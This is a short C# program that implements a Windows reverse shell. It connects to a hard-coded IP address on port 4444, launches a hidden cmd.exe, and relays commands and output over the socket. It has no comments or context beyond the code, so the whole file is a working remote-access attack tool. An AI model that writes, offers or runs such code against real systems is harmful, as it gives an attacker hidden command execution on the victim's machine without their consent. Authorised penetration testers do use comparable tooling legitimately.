using System;
using System.IO;
using System.Diagnostics;
using System.Net.Sockets;

class ReverseClient
{
    static void Main(string[] args)
    {
        string rhost = "192.168.23.101"; 
        int rport = 4444;
        try
        {
            using (TcpClient client = new TcpClient(rhost, rport))
            {
                using (Stream stream = client.GetStream())
                {
                    using (StreamReader reader = new StreamReader(stream))
                    {
                        using (StreamWriter writer = new StreamWriter(stream))
                        {
                            Process p = new Process();
                            p.StartInfo.FileName = "cmd.exe";
                            p.StartInfo.CreateNoWindow = true;
                            p.StartInfo.UseShellExecute = false;
                            
                            p.StartInfo.RedirectStandardInput = true;
                            p.StartInfo.RedirectStandardOutput = true;
                            p.StartInfo.RedirectStandardError = true;

                            p.Start();

                        
                            
                            var inputThread = new System.Threading.Thread(() =>
                            {
                                while (!p.HasExited)
                                {
                                    int ch = stream.ReadByte();
                                    if (ch == -1) break;
                                    p.StandardInput.Write((char)ch);
                                }
                            });
                            inputThread.Start();

                            char[] buffer = new char[4096];
                            int bytesRead;
                            while ((bytesRead = p.StandardOutput.Read(buffer, 0, buffer.Length)) > 0)
                            {
                                writer.Write(buffer, 0, bytesRead);
                                writer.Flush();
                            }
                        }
                    }
                }
            }
        }
        catch (Exception ex)
        {

            Console.WriteLine("Error: " + ex.Message);
        }
    }
}
